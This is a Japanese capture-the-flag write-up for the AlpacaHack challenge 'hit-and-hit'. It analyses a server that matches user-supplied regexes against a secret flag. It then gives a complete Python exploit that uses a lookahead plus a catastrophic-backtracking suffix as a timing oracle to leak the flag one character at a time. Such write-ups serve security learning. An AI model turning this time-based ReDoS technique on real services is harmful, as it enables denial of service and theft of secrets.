# hit-and-hit writeup
<https://alpacahack.com/daily/challenges/hit-and-hit?month=2026-02>

## 1. 概要
本問題はユーザーの入力した正規表現がサーバー側で評価される仕様を利用して，Time-Based Blind ReDoS攻撃を行う問題である．

## 2. 問題の分析

### ファイル構成
提供されたファイル群にはDockerfile，app.py，compose.yamlが含まれている．Docker環境ではsocatを用いてポート1337でapp.pyが実行される．

### ソースコードの確認
`app.py`のソースコードを確認すると以下のようになっている．

```python
import os, re

FLAG = os.environ.get("FLAG", "Alpaca{REDACTED}")
assert re.fullmatch(r"Alpaca\{\w+\}", FLAG)

while pattern := input("regex> "):
    re.match(pattern, FLAG)
    print("Hit!!!")
```

ユーザーの入力を`pattern`として受け取り，`re.match(pattern, FLAG)`でフラグとの照合を行っている．マッチの成否にかかわらず常に`Hit!!!`と出力されるため，実行結果から直接フラグの内容を知ることはできない．またアサート文からフラグの形式が`Alpaca{\w+}`であることがわかる．

## 3. 脆弱性と攻略方針

### 脆弱性
Pythonの`re`モジュールはバックトラック型の正規表現エンジンを使用している．ユーザーの入力をそのまま正規表現として評価するため，意図的にバックトラックを大量発生させる悪意のある正規表現を入力することで処理時間を極端に増大させることができる．

### 攻略方針：
推測した文字が正しい場合のみ膨大なバックトラックが発生してタイムアウトするように正規表現を構築し，1文字ずつフラグを特定する．
具体的には肯定先読み`(?=...)`を用いて推測文字列を検証し，一致したと判定された場合に`(:?.|.|...)+!`のような分岐の多い重い処理をフラグ全体に対して評価させるペイロードを使用する．応答にかかった時間を計測し，閾値を超えた場合は推測が正解であると判断して次の文字の特定に移る．

## 4. エクスプロイトコード

```python
import socket
import string
import time

HOST = 'localhost' 
PORT = 1337

CHARSET = string.ascii_letters + string.digits + "_}"
known_flag = "Alpaca{"
TIMEOUT = 1.0 

branches = "|".join(["."] * 15)
REDOS_SUFFIX = f"(?:{branches})+!"

while not known_flag.endswith("}"):
    for c in CHARSET:
        guess = known_flag + c
        escaped_guess = guess.replace("{", "\\{").replace("}", "\\}")
        
        payload = f"(?={escaped_guess}){REDOS_SUFFIX}\n"
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            s.connect((HOST, PORT))
            
            s.recv(1024) 
            
            start_time = time.time()
            s.sendall(payload.encode())
            
            s.recv(1024)
            s.close()
            
        except socket.timeout:
            known_flag += c
            s.close()
            break
            
        except Exception:
            s.close()
            time.sleep(1)
            break

print(f"FLAG: {known_flag}")
```